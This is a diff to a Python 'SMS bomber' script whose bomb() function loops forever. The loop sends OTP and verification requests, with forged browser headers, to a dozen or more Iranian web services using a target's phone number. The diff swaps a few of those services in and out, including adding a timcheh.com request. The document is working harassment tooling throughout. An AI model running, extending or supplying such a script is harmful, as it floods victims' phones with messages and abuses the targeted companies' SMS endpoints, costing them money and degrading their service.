@@ -39,12 +39,8 @@ def bomb():
     shj = {"mobile":f"{phone}","country_code":"+98"}
     eeh = {'Host': 'api.snapp.ir' , 'Content-Length':'23' , 'Accept':'*/*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json' , 'Referer':'https://snapp.ir/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
     eej = {"phone":f"{phone}"}
-    sih = {'Host': 'www.simkhanapi.ir' , 'Content-Length':'54' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=utf-8' , 'Referer':'https://simkhan.ir/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
-    sij = {"mobileNumber":f"{phone}","referenceAgentCode":""}
     shh = {'Host': 'www.sheypoor.com' , 'Content-Length':'26' , 'Accept':'application/json' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=utf-8' , 'Referer':'https://www.sheypoor.com/session' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
     shj = {"username":f"{phone}"}
-    aah = {'Host': 'api.anargift.com' , 'Content-Length':'34' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=utf-8' , 'Referer':'https://anargift.com/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
-    aaj = {"user":f"{phone}","app_id":99}
     mah = {'Host': 'api.behtarino.com' , 'Content-Length':'23' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=utf-8' , 'Referer':'https://marysbakery.ir/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
     maj = {"phone":f"{phone}"}
     pih = {'Host': 'pinket.com' , 'Content-Length':'29' , 'Accept':'*/*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=UTF-8' , 'Referer':'https://pinket.com/auth/phoneNumber' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
@@ -55,7 +51,10 @@ def bomb():
     oij = {"mobile":phone}
     mah = {'Host': 'api.malichii.com' , 'Content-Length':'24' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=utf-8' , 'Referer':'https://malichii.com/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
     maj = {"mobile":phone}
+    tih = {'Host': 'api.timcheh.com' , 'Content-Length':'24' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.9,fa;q=0.8' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=utf-8' , 'Referer':'https://timcheh.com/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
+    tij = {"mobile":phone}
     while True:
+        print(requests.post('https://api.timcheh.com/auth/otp/send' , headers=tih , json=tij))
         print(requests.post('https://base.darmankade.com/v1/PatientLogin' , headers=oih , json=oij))
         print(requests.post('https://api.timcheh.com/auth/otp/send' , headers=dih , json=dij))
         print(requests.post('https://pinket.com/api/cu/v2/phone-verification' , headers=pih , json=pij))
@@ -76,7 +75,7 @@ def bomb():
         print(requests.post('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request' , headers=nmh , json=nmj))
         print(requests.get(f'https://filmnet.ir/api-v2/access-token/users/{phone}/otp'))
         print(requests.get(f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{phone}/sms?cCode=%2098'))
-
+        
 
 print(Fore.LIGHTGREEN_EX + '[!]' + Fore.LIGHTWHITE_EX + 'Sending...')
 bomb()
